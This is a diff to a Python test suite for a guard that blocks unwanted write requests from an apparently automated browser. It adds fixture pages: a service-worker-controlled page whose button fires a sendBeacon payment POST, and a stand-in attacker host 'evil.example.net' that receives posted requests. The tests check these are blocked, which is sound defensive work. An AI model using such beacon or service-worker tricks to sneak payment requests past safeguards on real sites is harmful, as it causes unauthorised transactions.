@@ -86,6 +86,12 @@ PAGES = {
                     "self.addEventListener('activate',e=>e.waitUntil(clients.claim()));"
                     "self.addEventListener('fetch',e=>{if(e.request.url.includes('sw-trigger'))"
                     "e.respondWith(fetch('/api/pay',{method:'POST',body:'y'}).then(()=>new Response('ok')))});"),
+    # A page a service worker controls: with Chromium's KeepAliveInBrowserMigration on, its
+    # beacons bypass every Fetch session (measured by G9c); the worker disables it.
+    "/docs/sw_beacon": "<button id=\"b\" onclick=\"navigator.sendBeacon('/api/pay','amount=500')\">Next</button>"
+                       "<script>navigator.serviceWorker.register('/docs/sw.js')</script>",
+    "/docs/late_frame": "<button id=\"b\" onclick=\"document.title='clicked'\">Next</button>"
+                        "<script>window.__alive=[];addEventListener('message',e=>window.__alive.push(e.data))</script>",
     "/docs/get_only": "<button id=\"b\" onclick=\"fetch('/docs/data').then(r=>r.text()).then(t=>document.title='got')\">Next</button>",
     "/docs/link": '<a id="b" href="/docs/next">Read guide</a>',
     # A plain button whose handler submits its form (a submit-role control is A4 for the
@@ -99,6 +105,8 @@ PAGES = {
 
 def _pages(host: str, path: str):
     if host.startswith("evil"):
+        if path == "/alive":
+            return "<script>parent.postMessage('alive','*')</script>"
         if path == "/frame":
             return "<script>addEventListener('message',()=>fetch('https://evil.example.net/api/pay',{method:'POST',body:'z'}))</script>"
         return None
@@ -235,6 +243,37 @@ async def test_a_service_worker_write_does_not_escape(g):
     result, writes, _seen = await _route(g, "/docs/sw")
     _blocked(result, "POST")
     assert writes == []
+
+
+async def _controlled(rig, path):
+    for _ in range(40):  # the worker controls the page after a reload
+        rig.session.goto(f"https://{DOMAIN}{path}")
+        if rig.session.js("!!navigator.serviceWorker.controller"):
+            return
+        time.sleep(0.1)
+    raise AssertionError("service worker never controlled the page")
+
+
+async def test_a_beacon_from_a_service_worker_controlled_page_does_not_escape(g):
+    module, rig, _h, _b = g
+    await _controlled(rig, "/docs/sw_beacon")
+    result, writes, _seen = await _route(g, "/docs/sw_beacon")
+    _blocked(result, "BEACON")
+    assert writes == []
+
+
+async def test_frames_created_after_the_guard_are_not_left_paused(g):
+    """The guard cancels its auto-attach when it ends: a cross-origin frame created later
+    runs (a frame left waiting for a debugger would never post its message)."""
+    module, rig, _h, _b = g
+    result, writes, _seen = await _route(g, "/docs/late_frame")
+    assert result.state is StepState.VERIFIED_SUCCESS, result.reasons
+    rig.session.js("(()=>{const f=document.createElement('iframe');f.src='https://evil.example.net/alive';document.body.appendChild(f)})()")
+    for _ in range(50):
+        if rig.session.js("window.__alive.length"):
+            break
+        time.sleep(0.1)
+    assert rig.session.js("window.__alive") == ["alive"]
 
 
 async def test_a_custom_method_is_reported_in_the_closed_vocabulary_only(g):
